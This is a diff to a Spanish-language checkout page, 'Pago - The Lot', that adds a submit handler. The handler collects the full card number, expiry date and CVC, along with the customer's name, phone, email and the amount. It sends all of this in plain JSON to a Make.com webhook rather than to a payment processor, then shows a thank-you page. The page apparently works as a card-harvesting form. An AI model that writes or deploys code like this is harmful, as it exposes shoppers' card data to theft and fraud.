@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Pago - The Lot</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
     body {
       font-family: 'Helvetica Neue', Helvetica, sans-serif;
@@ -56,19 +57,70 @@
 <div class="container">
   <h1>Detalles de Pago</h1>
   <form id="pagoForm">
-    <input type="text" placeholder="Nombre en tarjeta" required>
-    <input type="text" placeholder="Número de tarjeta" required>
-    <input type="text" placeholder="MM/AA" required>
-    <input type="text" placeholder="CVC" required>
+    <input type="text" id="card_name" placeholder="Nombre en tarjeta" required>
+    <input type="text" id="card_number" placeholder="Número de tarjeta" required maxlength="16">
+    <input type="text" id="card_expiry" placeholder="MM/AA" required maxlength="5">
+    <input type="text" id="card_cvc" placeholder="CVC" required maxlength="4">
+    
+    <!-- Google reCAPTCHA -->
+    <div class="g-recaptcha" data-sitekey="TU_CLAVE_PUBLICA_RECAPTCHA"></div>
+
     <button type="submit">Pagar</button>
   </form>
 </div>
 
 <script>
   const form = document.getElementById('pagoForm');
-  form.addEventListener('submit', function(e) {
+
+  form.addEventListener('submit', async function(e) {
     e.preventDefault();
-    window.location.href = "gracias.html";
+
+    const recaptchaResponse = grecaptcha.getResponse();
+    if (!recaptchaResponse) {
+      alert('Por favor completa el reCAPTCHA.');
+      return;
+    }
+
+    const cardName = document.getElementById('card_name').value;
+    const cardNumber = document.getElementById('card_number').value;
+    const cardExpiry = document.getElementById('card_expiry').value;
+    const cardCvc = document.getElementById('card_cvc').value;
+
+    // Recuperamos otros datos desde la URL (nombre, correo, teléfono, amount)
+    const params = new URLSearchParams(window.location.search);
+    const customerName = params.get('customer_name');
+    const customerPhone = params.get('customer_phone');
+    const customerEmail = params.get('customer_email');
+    const amount = params.get('amount');
+
+    const data = {
+      card_name: cardName,
+      card_number: cardNumber,
+      card_expiry: cardExpiry,
+      card_cvc: cardCvc,
+      customer_name: customerName,
+      customer_phone: customerPhone,
+      customer_email: customerEmail,
+      amount: amount,
+      "g-recaptcha-response": recaptchaResponse
+    };
+
+    try {
+      await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      // Redirigir a página de gracias
+      window.location.href = "gracias.html";
+
+    } catch (error) {
+      console.error('Error enviando los datos:', error);
+      alert('Ocurrió un error al procesar tu pago. Intenta nuevamente.');
+    }
   });
 </script>
 
